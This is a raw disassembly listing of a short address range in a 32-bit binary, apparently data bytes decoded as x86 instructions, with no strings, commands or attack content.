  4046df:	00 0a                	add    %cl,(%edx)
  4046e1:	00 d4                	add    %dl,%ah
  4046e3:	14 55                	adc    $0x55,%al
  4046e5:	00 06                	add    %al,(%esi)
  4046e7:	00 ec                	add    %ch,%ah
  4046e9:	03 55 00             	add    0x0(%ebp),%edx
  4046ec:	1a 00                	sbb    (%eax),%al
  4046ee:	9d                   	popf
  4046ef:	04 01                	add    $0x1,%al
  4046f1:	10 06                	adc    %al,(%esi)
  4046f3:	00 12                	add    %dl,(%edx)
  4046f5:	00 06                	add    %al,(%esi)
  4046f7:	02 06                	add    (%esi),%al
  4046f9:	00 29                	add    %ch,(%ecx)
  4046fb:	0e                   	push   %cs
  4046fc:	98                   	cwtl
  4046fd:	0d 0e 00 cd 0f       	or     $0xfcd000e,%eax
  404702:	bd 0b 06 00 d1       	mov    $0xd100060b,%ebp
  404707:	11 98 0d 06 00 e2    	adc    %ebx,-0x1dfff9f3(%eax)
  40470d:	04 98                	add    $0x98,%al
  40470f:	0d 26 00 9c 0f       	or     $0xf9c0026,%eax
  404714:	96                   	xchg   %eax,%esi
  404715:	10 26                	adc    %ah,(%esi)
  404717:	00 5c 13 96          	add    %bl,-0x6a(%ebx,%edx,1)
  40471b:	10 26                	adc    %ah,(%esi)
  40471d:	00 bd 10 96 10 1a    	add    %bh,0x1a109610(%ebp)
  404723:	00 b5 10 75 12 26    	add    %dh,0x26127510(%ebp)
  404729:	00 74 13 96          	add    %dh,-0x6a(%ebx,%edx,1)
  40472d:	10 06                	adc    %al,(%esi)
  40472f:	00 43 0f             	add    %al,0xf(%ebx)
  404732:	98                   	cwtl
  404733:	0d 06 00 1f 13       	or     $0x131f0006,%eax
  404738:	2d 18 06 00 2d       	sub    $0x2d000618,%eax
  40473d:	0f 98 0d 06 00 b0 0d 	sets   0xdb00006
  404744:	2d 18 06 00 53       	sub    $0x53000618,%eax
  404749:	04 2d                	add    $0x2d,%al
  40474b:	18 06                	sbb    %al,(%esi)
  40474d:	00 27                	add    %ah,(%edi)
  40474f:	04 2d                	add    $0x2d,%al
  404751:	18 06                	sbb    %al,(%esi)
  404753:	00 ec                	add    %ch,%ah
  404755:	0d 2d 18 06 00       	or     $0x6182d,%eax
  40475a:	42                   	inc    %edx
  40475b:	04 2d                	add    $0x2d,%al
  40475d:	18 06                	sbb    %al,(%esi)
  40475f:	00 16                	add    %dl,(%esi)
  404761:	0f 2d 18             	cvtps2pi (%eax),%mm3
  404764:	06                   	push   %es
  404765:	00 de                	add    %bl,%dh
  404767:	10 98 0d 06 00 c0    	adc    %bl,-0x3ffff9f3(%eax)
  40476d:	17                   	pop    %ss
  40476e:	98                   	cwtl
  40476f:	0d 06 00 54 14       	or     $0x14540006,%eax
  404774:	75 12                	jne    0x404788
  404776:	06                   	push   %es
  404777:	00 bf 04 98 0d 00    	add    %bh,0xd9804(%edi)
  40477d:	00 00                	add    %al,(%eax)
  40477f:	00 bd 00 00 00 00    	add    %bh,0x0(%ebp)
  404785:	00 01                	add    %al,(%ecx)
  404787:	00 01                	add    %al,(%ecx)
  404789:	00 01                	add    %al,(%ecx)
  40478b:	00 10                	add    %dl,(%eax)
  40478d:	00 73 0d             	add    %dh,0xd(%ebx)
  404790:	50                   	push   %eax
  404791:	16                   	push   %ss
  404792:	3d 00 01 00 01       	cmp    $0x1000100,%eax
  404797:	00 81 01 10 00 a0    	add    %al,-0x5fffefff(%ecx)
  40479d:	13 50 16             	adc    0x16(%eax),%edx
  4047a0:	3d 00 01 00 03       	cmp    $0x3000100,%eax
  4047a5:	00 81 01 10 00 96    	add    %al,-0x69ffefff(%ecx)
  4047ab:	15 f7 0e 3d 00       	adc    $0x3d0ef7,%eax
  4047b0:	13 00                	adc    (%eax),%eax
  4047b2:	06                   	push   %es
  4047b3:	00 00                	add    %al,(%eax)
  4047b5:	00 10                	add    %dl,(%eax)
  4047b7:	00 f3                	add    %dh,%bl
  4047b9:	0f ee 0c 3d 00 1e 00 	pmaxsw 0x24001e00(,%edi,1),%mm1
  4047c0:	24 
  4047c1:	00 00                	add    %al,(%eax)
  4047c3:	00 10                	add    %dl,(%eax)
  4047c5:	00 c0                	add    %al,%al
  4047c7:	13 3a                	adc    (%edx),%edi
  4047c9:	11 3d 00 1e 00 26    	adc    %edi,0x26001e00
  4047cf:	00 81 01 10 00 0c    	add    %al,0xc001001(%ecx)
  4047d5:	0e                   	push   %cs
  4047d6:	3a 11                	cmp    (%ecx),%dl
  4047d8:	3d 00 1e 00 2d       	cmp    $0x2d001e00,%eax
  4047dd:	00 81 01 10 00 86    	add    %al,-0x79ffefff(%ecx)
  4047e3:	10 3a                	adc    %bh,(%edx)
  4047e5:	11 3d 00 1e 00 2f    	adc    %edi,0x2f001e00
  4047eb:	00 81 01 10 00 30    	add    %al,0x30001001(%ecx)
  4047f1:	12 3a                	adc    (%edx),%bh
  4047f3:	11 3d 00 1e 00 30    	adc    %edi,0x30001e00
  4047f9:	00 81 01 10 00 29    	add    %al,0x29001001(%ecx)
  4047ff:	0d 3a 11 3d 00       	or     $0x3d113a,%eax
  404804:	1e                   	push   %ds
  404805:	00 36                	add    %dh,(%esi)
  404807:	00 81 01 10 00 2a    	add    %al,0x2a001001(%ecx)
  40480d:	12 3a                	adc    (%edx),%bh
  40480f:	11 3d 00 1f 00 38    	adc    %edi,0x38001f00
  404815:	00 81 01 10 00 7e    	add    %al,0x7e001001(%ecx)
  40481b:	0c 3a                	or     $0x3a,%al
  40481d:	11 3d 00 1f 00 3e    	adc    %edi,0x3e001f00
  404823:	00 81 01 10 00 7f    	add    %al,0x7f001001(%ecx)
  404829:	18 3a                	sbb    %bh,(%edx)
  40482b:	11 3d 00 1f 00 41    	adc    %edi,0x41001f00
  404831:	00 81 01 10 00 8f    	add    %al,-0x70ffefff(%ecx)
  404837:	15 71 15 3d 00       	adc    $0x3d1571,%eax
  40483c:	20 00                	and    %al,(%eax)
  40483e:	46                   	inc    %esi
  40483f:	00 01                	add    %al,(%ecx)
  404841:	00 10                	add    %dl,(%eax)
  404843:	00 a6 00 9f 0d 3d    	add    %ah,0x3d0d9f00(%esi)
  404849:	00 21                	add    %ah,(%ecx)
  40484b:	00 4b 00             	add    %cl,0x0(%ebx)
  40484e:	81 01 10 00 9f 00    	addl   $0x9f0010,(%ecx)
  404854:	9f                   	lahf
  404855:	0d 3d 00 28 00       	or     $0x28003d,%eax
  40485a:	52                   	push   %edx
  40485b:	00 00                	add    %al,(%eax)
  40485d:	01 00                	add    %eax,(%eax)
  40485f:	00 c6                	add    %al,%dh
  404861:	00 00                	add    %al,(%eax)
  404863:	00 3d 00 28 00 54    	add    %bh,0x54002800
  404869:	00 02                	add    %al,(%edx)
  40486b:	01 00                	add    %eax,(%eax)
  40486d:	00 6f 01             	add    %ch,0x1(%edi)
  404870:	00 00                	add    %al,(%eax)
  404872:	d1 00                	roll   $1,(%eax)
  404874:	29 00                	sub    %eax,(%eax)
  404876:	54                   	push   %esp
  404877:	00 83 01 10 00 6d    	add    %al,0x6d001001(%ebx)
  40487d:	00 00                	add    %al,(%eax)
  40487f:	00 3d 00 2d 00 54    	add    %bh,0x54002d00
  404885:	00 15 01 00 00 38    	add    %dl,0x38000001
  40488b:	00 00                	add    %al,(%eax)
  40488d:	00 05 01 2e 00 54    	add    %al,0x54002e01
  404893:	00 16                	add    %dl,(%esi)
  404895:	00 e1                	add    %ah,%cl
  404897:	14 83                	adc    $0x83,%al
  404899:	05 16 00 ee 14       	add    $0x14ee0016,%eax
  40489e:	83 05 16 00 7d 0e 83 	addl   $0xffffff83,0xe7d0016
  4048a5:	05 16 00 f5 0c       	add    $0xcf50016,%eax
  4048aa:	83 05 16 00 78 10 83 	addl   $0xffffff83,0x10780016
  4048b1:	05 16 00 11 05       	add    $0x5110016,%eax
  4048b6:	83 05 16 00 24 18 83 	addl   $0xffffff83,0x18240016
  4048bd:	05 16 00 cd 01       	add    $0x1cd0016,%eax
  4048c2:	83 05 16 00 02 07 83 	addl   $0xffffff83,0x7020016
  4048c9:	05 16 00 bb 06       	add    $0x6bb0016,%eax
  4048ce:	83 05 16 00 fc 06 86 	addl   $0xffffff86,0x6fc0016
  4048d5:	05 16 00 b4 0b       	add    $0xbb40016,%eax
  4048da:	83 05 16 00 ad 00 8a 	addl   $0xffffff8a,0xad0016
  4048e1:	05 16 00 45 0e       	add    $0xe450016,%eax
  4048e6:	83 05 16 00 a1 01 83 	addl   $0xffffff83,0x1a10016
  4048ed:	05 16 00 b4 02       	add    $0x2b40016,%eax
  4048f2:	83 05 16 00 a8 17 83 	addl   $0xffffff83,0x17a80016
  4048f9:	05 16 00 ed 0f       	add    $0xfed0016,%eax
  4048fe:	83 05 11 00 c0 03 8e 	addl   $0xffffff8e,0x3c00011
  404905:	05 11 00 a5 03       	add    $0x3a50011,%eax
  40490a:	92                   	xchg   %eax,%edx
  40490b:	05 11 00 75 03       	add    $0x3750011,%eax
  404910:	96                   	xchg   %eax,%esi
  404911:	05 11 00 0b 03       	add    $0x30b0011,%eax
  404916:	9a 05 11 00 8d 03 9a 	lcall  $0x9a03,$0x8d001105
  40491d:	05 11 00 f0 02       	add    $0x2f00011,%eax
  404922:	9d                   	popf
  404923:	05 11 00 d3 02       	add    $0x2d30011,%eax
  404928:	a1 05 31 00 b9       	mov    0xb9003105,%eax
  40492d:	02 a4 05 11 00 27 03 	add    0x3270011(%ebp,%eax,1),%ah
  404934:	9d                   	popf
  404935:	05 11 00 5b 03       	add    $0x35b0011,%eax
  40493a:	48                   	dec    %eax
  40493b:	03 11                	add    (%ecx),%edx
  40493d:	00 3d 03 a1 05 16    	add    %bh,0x1605a103
  404943:	00 d1                	add    %dl,%cl
  404945:	0f                   	xstore-rng (bad)
  404946:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404947:	05 31 00 6c 01       	add    $0x16c0031,%eax
  40494c:	83 05 16 00 de 13 ac 	addl   $0xffffffac,0x13de0016
  404953:	05 51 80 a6 0b       	add    $0xba68051,%eax
  404958:	48                   	dec    %eax
  404959:	03 51 80             	add    -0x80(%ecx),%edx
  40495c:	a2 0b 48 03 51       	mov    %al,0x5103480b
  404961:	80 99 0b 48 03 51 80 	sbbb   $0x80,0x5103480b(%ecx)
  404968:	7d 0b                	jge    0x404975
  40496a:	48                   	dec    %eax
  40496b:	03 21                	add    (%ecx),%esp
  40496d:	00 28                	add    %ch,(%eax)
  40496f:	18 96 05 21 00 09    	sbb    %dl,0x9002105(%esi)
  404975:	18 96 05 31 00 cc    	sbb    %dl,-0x33ffcefb(%esi)
  40497b:	15 96 05 33 01       	adc    $0x1330596,%eax
  404980:	e5 00                	in     $0x0,%eax
  404982:	b6 05                	mov    $0x5,%dh
  404984:	06                   	push   %es
  404985:	06                   	push   %es
  404986:	d1 01                	roll   $1,(%ecx)
  404988:	ba 05 56 80 a6       	mov    $0xa6805605,%edx
  40498d:	01 bd 05 56 80 3c    	add    %edi,0x3c805605(%ebp)
  404993:	01 bd 05 56 80 29    	add    %edi,0x29805605(%ebp)
  404999:	01 bd 05 16 00 0b    	add    %edi,0xb001605(%ebp)
  40499f:	00 c1                	add    %al,%cl
  4049a1:	05 50 20 00 00       	add    $0x2050,%eax
  4049a6:	00 00                	add    %al,(%eax)
  4049a8:	96                   	xchg   %eax,%esi
  4049a9:	00 14 0e             	add    %dl,(%esi,%ecx,1)
  4049ac:	bc 01 01 00 5c       	mov    $0x5c000101,%esp
  4049b1:	21 00                	and    %eax,(%eax)
  4049b3:	00 00                	add    %al,(%eax)
  4049b5:	00 86 18 db 11 06    	add    %al,0x611db18(%esi)
  4049bb:	00 01                	add    %al,(%ecx)
  4049bd:	00 68 21             	add    %ch,0x21(%eax)
  4049c0:	00 00                	add    %al,(%eax)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	96                   	xchg   %eax,%esi
  4049c5:	00 96 13 c9 02 01    	add    %dl,0x102c913(%esi)
  4049cb:	00 7c 21 00          	add    %bh,0x0(%ecx,%eiz,1)
  4049cf:	00 00                	add    %al,(%eax)
  4049d1:	00 91 00 4d 0b c9    	add    %dl,-0x36f4b300(%ecx)
  4049d7:	02 01                	add    (%ecx),%al
  4049d9:	00 e8                	add    %ch,%al
  4049db:	21 00                	and    %eax,(%eax)
  4049dd:	00 00                	add    %al,(%eax)
  4049df:	00 91 18 e1 11 bc    	add    %dl,-0x43ee1ee8(%ecx)
  4049e5:	01 01                	add    %eax,(%ecx)
  4049e7:	00 a4 22 00 00 00 00 	add    %ah,0x0(%edx,%eiz,1)
  4049ee:	96                   	xchg   %eax,%esi
  4049ef:	08 26                	or     %ah,(%esi)
  4049f1:	16                   	push   %ss
  4049f2:	de 05 01 00 ab 22    	fiadds 0x22ab0001
  4049f8:	00 00                	add    %al,(%eax)
  4049fa:	00 00                	add    %al,(%eax)
  4049fc:	96                   	xchg   %eax,%esi
  4049fd:	08 34 16             	or     %dh,(%esi,%edx,1)
  404a00:	e3 05                	jecxz  0x404a07
  404a02:	01 00                	add    %eax,(%eax)
  404a04:	b3 22                	mov    $0x22,%bl
  404a06:	00 00                	add    %al,(%eax)
  404a08:	00 00                	add    %al,(%eax)
  404a0a:	96                   	xchg   %eax,%esi
  404a0b:	08 0a                	or     %cl,(%edx)
  404a0d:	16                   	push   %ss
  404a0e:	e9 05 02 00 ba       	jmp    0xba404c18
  404a13:	22 00                	and    (%eax),%al
  404a15:	00 00                	add    %al,(%eax)
  404a17:	00 96 08 18 16 ee    	add    %dl,-0x11e9e7f8(%esi)
  404a1d:	05 02 00 c2 22       	add    $0x22c20002,%eax
  404a22:	00 00                	add    %al,(%eax)
  404a24:	00 00                	add    %al,(%eax)
  404a26:	91                   	xchg   %eax,%ecx
  404a27:	08 cf                	or     %cl,%bh
  404a29:	10 f4                	adc    %dh,%ah
  404a2b:	05 03 00 c9 22       	add    $0x22c90003,%eax
  404a30:	00 00                	add    %al,(%eax)
  404a32:	00 00                	add    %al,(%eax)
  404a34:	91                   	xchg   %eax,%ecx
  404a35:	08 da                	or     %bl,%dl
  404a37:	10 f9                	adc    %bh,%cl
  404a39:	05 03 00 d1 22       	add    $0x22d10003,%eax
  404a3e:	00 00                	add    %al,(%eax)
  404a40:	00 00                	add    %al,(%eax)
  404a42:	91                   	xchg   %eax,%ecx
  404a43:	08 7c 09 ff          	or     %bh,-0x1(%ecx,%ecx,1)
  404a47:	05 04 00 d8 22       	add    $0x22d80004,%eax
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 00                	add    %al,(%eax)
  404a50:	91                   	xchg   %eax,%ecx
  404a51:	08 8b 09 03 06 04    	or     %cl,0x4060309(%ebx)
  404a57:	00 e0                	add    %ah,%al
  404a59:	22 00                	and    (%eax),%al
  404a5b:	00 00                	add    %al,(%eax)
  404a5d:	00 91 08 a3 15 ff    	add    %dl,-0xea5cf8(%ecx)
  404a63:	05 05 00 e7 22       	add    $0x22e70005,%eax
  404a68:	00 00                	add    %al,(%eax)
  404a6a:	00 00                	add    %al,(%eax)
  404a6c:	91                   	xchg   %eax,%ecx
  404a6d:	08 ae 15 03 06 05    	or     %ch,0x5060315(%esi)
  404a73:	00 ef                	add    %ch,%bh
  404a75:	22 00                	and    (%eax),%al
  404a77:	00 00                	add    %al,(%eax)
  404a79:	00 91 08 30 09 08    	add    %dl,0x8093008(%ecx)
  404a7f:	06                   	push   %es
  404a80:	06                   	push   %es
  404a81:	00 f6                	add    %dh,%dh
  404a83:	22 00                	and    (%eax),%al
  404a85:	00 00                	add    %al,(%eax)
  404a87:	00 91 08 3e 09 0d    	add    %dl,0xd093e08(%ecx)
  404a8d:	06                   	push   %es
  404a8e:	06                   	push   %es
  404a8f:	00 fe                	add    %bh,%dh
  404a91:	22 00                	and    (%eax),%al
  404a93:	00 00                	add    %al,(%eax)
  404a95:	00 96 08 82 02 c9    	add    %dl,-0x36fd7df8(%esi)
  404a9b:	02 07                	add    (%edi),%al
  404a9d:	00 05 23 00 00 00    	add    %al,0x23
  404aa3:	00 96 08 92 02 13    	add    %dl,0x13029208(%esi)
  404aa9:	06                   	push   %es
  404aaa:	07                   	pop    %es
  404aab:	00 0d 23 00 00 00    	add    %cl,0x23
  404ab1:	00 91 08 37 02 18    	add    %dl,0x18023708(%ecx)
  404ab7:	06                   	push   %es
  404ab8:	08 00                	or     %al,(%eax)
  404aba:	14 23                	adc    $0x23,%al
  404abc:	00 00                	add    %al,(%eax)
  404abe:	00 00                	add    %al,(%eax)
  404ac0:	91                   	xchg   %eax,%ecx
  404ac1:	08 dc                	or     %bl,%ah
  404ac3:	09 08                	or     %ecx,(%eax)
  404ac5:	06                   	push   %es
  404ac6:	08 00                	or     %al,(%eax)
  404ac8:	1b 23                	sbb    (%ebx),%esp
  404aca:	00 00                	add    %al,(%eax)
  404acc:	00 00                	add    %al,(%eax)
  404ace:	91                   	xchg   %eax,%ecx
  404acf:	08 e5                	or     %ah,%ch
  404ad1:	09 0d 06 08 00 23    	or     %ecx,0x23000806
  404ad7:	23 00                	and    (%eax),%eax
  404ad9:	00 00                	add    %al,(%eax)
  404adb:	00 96 08 d4 0c 83    	add    %dl,-0x7cf32bf8(%esi)
  404ae1:	02 09                	add    (%ecx),%cl
  404ae3:	00 2a                	add    %ch,(%edx)
  404ae5:	23 00                	and    (%eax),%eax
  404ae7:	00 00                	add    %al,(%eax)
  404ae9:	00 96 08 e1 0c 2c    	add    %dl,0x2c0ce108(%esi)
  404aef:	00 09                	add    %cl,(%ecx)
  404af1:	00 32                	add    %dh,(%edx)
  404af3:	23 00                	and    (%eax),%eax
  404af5:	00 00                	add    %al,(%eax)
  404af7:	00 96 08 f3 0a c9    	add    %dl,-0x36f50cf8(%esi)
  404afd:	02 0a                	add    (%edx),%cl
  404aff:	00 39                	add    %bh,(%ecx)
  404b01:	23 00                	and    (%eax),%eax
  404b03:	00 00                	add    %al,(%eax)
  404b05:	00 96 08 04 0b 13    	add    %dl,0x130b0408(%esi)
  404b0b:	06                   	push   %es
  404b0c:	0a 00                	or     (%eax),%al
  404b0e:	44                   	inc    %esp
  404b0f:	23 00                	and    (%eax),%eax
  404b11:	00 00                	add    %al,(%eax)
  404b13:	00 96 00 f9 15 bc    	add    %dl,-0x43ea0700(%esi)
  404b19:	01 0b                	add    %ecx,(%ebx)
  404b1b:	00 bc 26 00 00 00 00 	add    %bh,0x0(%esi,%eiz,1)
  404b22:	91                   	xchg   %eax,%ecx
  404b23:	00 06                	add    %al,(%esi)
  404b25:	06                   	push   %es
  404b26:	36 00 0b             	add    %cl,%ss:(%ebx)
  404b29:	00 d8                	add    %bl,%al
  404b2b:	26 00 00             	add    %al,%es:(%eax)
  404b2e:	00 00                	add    %al,(%eax)
  404b30:	91                   	xchg   %eax,%ecx
  404b31:	00 f4                	add    %dh,%ah
  404b33:	06                   	push   %es
  404b34:	1c 06                	sbb    $0x6,%al
  404b36:	0c 00                	or     $0x0,%al
  404b38:	ec                   	in     (%dx),%al
  404b39:	26 00 00             	add    %al,%es:(%eax)
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	96                   	xchg   %eax,%esi
  404b3f:	00 4d 15             	add    %cl,0x15(%ebp)
  404b42:	bc 01 10 00 60       	mov    $0x60001001,%esp
  404b47:	27                   	daa
  404b48:	00 00                	add    %al,(%eax)
  404b4a:	00 00                	add    %al,(%eax)
  404b4c:	96                   	xchg   %eax,%esi
  404b4d:	00 d9                	add    %bl,%cl
  404b4f:	01 27                	add    %esp,(%edi)
  404b51:	06                   	push   %es
  404b52:	10 00                	adc    %al,(%eax)
  404b54:	a8 29                	test   $0x29,%al
  404b56:	00 00                	add    %al,(%eax)
  404b58:	00 00                	add    %al,(%eax)
  404b5a:	96                   	xchg   %eax,%esi
  404b5b:	00 e0                	add    %ah,%al
  404b5d:	03 f9                	add    %ecx,%edi
  404b5f:	05 11 00 30 2b       	add    $0x2b300011,%eax
  404b64:	00 00                	add    %al,(%eax)
  404b66:	00 00                	add    %al,(%eax)
  404b68:	96                   	xchg   %eax,%esi
  404b69:	00 86 15 a5 01 12    	add    %al,0x1201a515(%esi)
  404b6f:	00 a4 2b 00 00 00 00 	add    %ah,0x0(%ebx,%ebp,1)
  404b76:	91                   	xchg   %eax,%ecx
  404b77:	00 10                	add    %dl,(%eax)
  404b79:	0b a5 01 13 00 f0    	or     -0xfffecff(%ebp),%esp
  404b7f:	2b 00                	sub    (%eax),%eax
  404b81:	00 00                	add    %al,(%eax)
  404b83:	00 91 18 e1 11 bc    	add    %dl,-0x43ee1ee8(%ecx)
  404b89:	01 14 00             	add    %edx,(%eax,%eax,1)
  404b8c:	fc                   	cld
  404b8d:	2b 00                	sub    (%eax),%eax
  404b8f:	00 00                	add    %al,(%eax)
  404b91:	00 96 00 f5 0c bc    	add    %dl,-0x43f30b00(%esi)
  404b97:	01 14 00             	add    %edx,(%eax,%eax,1)
  404b9a:	18 2f                	sbb    %ch,(%edi)
  404b9c:	00 00                	add    %al,(%eax)
  404b9e:	00 00                	add    %al,(%eax)
  404ba0:	86 18                	xchg   %bl,(%eax)
  404ba2:	db 11                	fistl  (%ecx)
  404ba4:	06                   	push   %es
  404ba5:	00 14 00             	add    %dl,(%eax,%eax,1)
  404ba8:	24 2f                	and    $0x2f,%al
  404baa:	00 00                	add    %al,(%eax)
  404bac:	00 00                	add    %al,(%eax)
  404bae:	96                   	xchg   %eax,%esi
  404baf:	00 ce                	add    %cl,%dh
  404bb1:	13 bc 01 14 00 64 2f 	adc    0x2f640014(%ecx,%eax,1),%edi
  404bb8:	00 00                	add    %al,(%eax)
  404bba:	00 00                	add    %al,(%eax)
  404bbc:	91                   	xchg   %eax,%ecx
  404bbd:	00 5a 0c             	add    %bl,0xc(%edx)
  404bc0:	c9                   	leave
  404bc1:	02 14 00             	add    (%eax,%eax,1),%dl
  404bc4:	bc 2f 00 00 00       	mov    $0x2f,%esp
  404bc9:	00 91 00 9c 01 c9    	add    %dl,-0x36fe6400(%ecx)
  404bcf:	02 14 00             	add    (%eax,%eax,1),%dl
  404bd2:	0c 30                	or     $0x30,%al
  404bd4:	00 00                	add    %al,(%eax)
  404bd6:	00 00                	add    %al,(%eax)
  404bd8:	91                   	xchg   %eax,%ecx
  404bd9:	00 50 11             	add    %dl,0x11(%eax)
  404bdc:	c9                   	leave
  404bdd:	02 14 00             	add    (%eax,%eax,1),%dl
  404be0:	3c 31                	cmp    $0x31,%al
  404be2:	00 00                	add    %al,(%eax)
  404be4:	00 00                	add    %al,(%eax)
  404be6:	91                   	xchg   %eax,%ecx
  404be7:	00 f2                	add    %dh,%dl
  404be9:	10 c9                	adc    %cl,%cl
  404beb:	02 14 00             	add    (%eax,%eax,1),%dl
  404bee:	7c 31                	jl     0x404c21
  404bf0:	00 00                	add    %al,(%eax)
  404bf2:	00 00                	add    %al,(%eax)
  404bf4:	91                   	xchg   %eax,%ecx
  404bf5:	00 86 04 c9 02 14    	add    %al,0x1402c904(%esi)
  404bfb:	00 c4                	add    %al,%ah
  404bfd:	31 00                	xor    %eax,(%eax)
  404bff:	00 00                	add    %al,(%eax)
  404c01:	00 86 18 db 11 06    	add    %al,0x611db18(%esi)
  404c07:	00 14 00             	add    %dl,(%eax,%eax,1)
  404c0a:	d0 31                	shlb   $1,(%ecx)
  404c0c:	00 00                	add    %al,(%eax)
  404c0e:	00 00                	add    %al,(%eax)
  404c10:	96                   	xchg   %eax,%esi
  404c11:	00 5d 01             	add    %bl,0x1(%ebp)
  404c14:	30 02                	xor    %al,(%edx)
  404c16:	14 00                	adc    $0x0,%al
  404c18:	50                   	push   %eax
  404c19:	32 00                	xor    (%eax),%al
  404c1b:	00 00                	add    %al,(%eax)
  404c1d:	00 96 00 45 0b 5d    	add    %dl,0x5d0b4500(%esi)
  404c23:	00 14 00             	add    %dl,(%eax,%eax,1)
  404c26:	c8 32 00 00          	enter  $0x32,$0x0
  404c2a:	00 00                	add    %al,(%eax)
  404c2c:	96                   	xchg   %eax,%esi
  404c2d:	00 64 0f f4          	add    %ah,-0xc(%edi,%ecx,1)
  404c31:	05 15 00 98 34       	add    $0x34980015,%eax
  404c36:	00 00                	add    %al,(%eax)
  404c38:	00 00                	add    %al,(%eax)
  404c3a:	96                   	xchg   %eax,%esi
  404c3b:	00 4e 0e             	add    %cl,0xe(%esi)
  404c3e:	c9                   	leave
  404c3f:	02 15 00 c0 34 00    	add    0x34c000,%dl
  404c45:	00 00                	add    %al,(%eax)
  404c47:	00 96 00 bf 15 bc    	add    %dl,-0x43ea4100(%esi)
  404c4d:	01 15 00 30 35 00    	add    %edx,0x353000
  404c53:	00 00                	add    %al,(%eax)
  404c55:	00 96 00 f4 14 30    	add    %dl,0x3014f400(%esi)
  404c5b:	02 15 00 18 36 00    	add    0x361800,%dl
  404c61:	00 00                	add    %al,(%eax)
  404c63:	00 96 00 c4 10 2d    	add    %dl,0x2d10c400(%esi)
  404c69:	06                   	push   %es
  404c6a:	15 00 68 36 00       	adc    $0x366800,%eax
  404c6f:	00 00                	add    %al,(%eax)
  404c71:	00 96 00 c0 0f bc    	add    %dl,-0x43f04000(%esi)
  404c77:	01 16                	add    %edx,(%esi)
  404c79:	00 9c 36 00 00 00 00 	add    %bl,0x0(%esi,%esi,1)
  404c80:	96                   	xchg   %eax,%esi
  404c81:	00 39                	add    %bh,(%ecx)
  404c83:	05 30 02 16 00       	add    $0x160230,%eax
  404c88:	fc                   	cld
  404c89:	36 00 00             	add    %al,%ss:(%eax)
  404c8c:	00 00                	add    %al,(%eax)
  404c8e:	96                   	xchg   %eax,%esi
  404c8f:	00 9c 17 c9 02 16 00 	add    %bl,0x1602c9(%edi,%edx,1)
  404c96:	24 37                	and    $0x37,%al
  404c98:	00 00                	add    %al,(%eax)
  404c9a:	00 00                	add    %al,(%eax)
  404c9c:	96                   	xchg   %eax,%esi
  404c9d:	00 91 17 bc 01 16    	add    %dl,0x1601bc17(%ecx)
  404ca3:	00 00                	add    %al,(%eax)
  404ca5:	00 00                	add    %al,(%eax)
  404ca7:	00 80 00 96 20 6a    	add    %al,0x6a209600(%eax)
  404cad:	17                   	pop    %ss
  404cae:	36 06                	ss push %es
  404cb0:	16                   	push   %ss
  404cb1:	00 00                	add    %al,(%eax)
  404cb3:	00 00                	add    %al,(%eax)
  404cb5:	00 80 00 96 20 57    	add    %al,0x57209600(%eax)
  404cbb:	17                   	pop    %ss
  404cbc:	3a 06                	cmp    (%esi),%al
  404cbe:	16                   	push   %ss
  404cbf:	00 00                	add    %al,(%eax)
  404cc1:	00 00                	add    %al,(%eax)
  404cc3:	00 80 00 96 20 d2    	add    %al,-0x2ddf6a00(%eax)
  404cc9:	04 43                	add    $0x43,%al
  404ccb:	06                   	push   %es
  404ccc:	19 00                	sbb    %eax,(%eax)
  404cce:	00 00                	add    %al,(%eax)
  404cd0:	00 00                	add    %al,(%eax)
  404cd2:	80 00 96             	addb   $0x96,(%eax)
  404cd5:	20 8c 16 48 06 1a 00 	and    %cl,0x1a0648(%esi,%edx,1)
  404cdc:	00 00                	add    %al,(%eax)
  404cde:	00 00                	add    %al,(%eax)
  404ce0:	80 00 96             	addb   $0x96,(%eax)
  404ce3:	20 38                	and    %bh,(%eax)
  404ce5:	07                   	pop    %es
  404ce6:	4f                   	dec    %edi
  404ce7:	06                   	push   %es
  404ce8:	1c 00                	sbb    $0x0,%al
  404cea:	00 00                	add    %al,(%eax)
  404cec:	00 00                	add    %al,(%eax)
  404cee:	80 00 96             	addb   $0x96,(%eax)
  404cf1:	20 66 0c             	and    %ah,0xc(%esi)
  404cf4:	56                   	push   %esi
  404cf5:	06                   	push   %es
  404cf6:	1d 00 54 37 00       	sbb    $0x375400,%eax
  404cfb:	00 00                	add    %al,(%eax)
  404cfd:	00 96 00 1d 0a 5d    	add    %dl,0x5d0a1d00(%esi)
  404d03:	06                   	push   %es
  404d04:	20 00                	and    %al,(%eax)
  404d06:	80 37 00             	xorb   $0x0,(%edi)
  404d09:	00 00                	add    %al,(%eax)
  404d0b:	00 96 00 66 15 bc    	add    %dl,-0x43ea9a00(%esi)
  404d11:	01 22                	add    %esp,(%edx)
  404d13:	00 c8                	add    %cl,%al
  404d15:	37                   	aaa
  404d16:	00 00                	add    %al,(%eax)
  404d18:	00 00                	add    %al,(%eax)
  404d1a:	96                   	xchg   %eax,%esi
  404d1b:	00 c7                	add    %al,%bh
  404d1d:	15 bc 01 22 00       	adc    $0x2201bc,%eax
  404d22:	08 38                	or     %bh,(%eax)
  404d24:	00 00                	add    %al,(%eax)
  404d26:	00 00                	add    %al,(%eax)
  404d28:	96                   	xchg   %eax,%esi
  404d29:	00 21                	add    %ah,(%ecx)
  404d2b:	09 65 06             	or     %esp,0x6(%ebp)
  404d2e:	22 00                	and    (%eax),%al
  404d30:	74 38                	je     0x404d6a
  404d32:	00 00                	add    %al,(%eax)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	96                   	xchg   %eax,%esi
  404d37:	00 18                	add    %bl,(%eax)
  404d39:	09 62 00             	or     %esp,0x0(%edx)
  404d3c:	24 00                	and    $0x0,%al
  404d3e:	e4 38                	in     $0x38,%al
  404d40:	00 00                	add    %al,(%eax)
  404d42:	00 00                	add    %al,(%eax)
  404d44:	96                   	xchg   %eax,%esi
  404d45:	00 0c 09             	add    %cl,(%ecx,%ecx,1)
  404d48:	36 00 25 00 50 39 00 	add    %ah,%ss:0x395000
  404d4f:	00 00                	add    %al,(%eax)
  404d51:	00 96 00 e3 17 c9    	add    %dl,-0x36e81d00(%esi)
  404d57:	02 26                	add    (%esi),%ah
  404d59:	00 c0                	add    %al,%al
  404d5b:	39 00                	cmp    %eax,(%eax)
  404d5d:	00 00                	add    %al,(%eax)
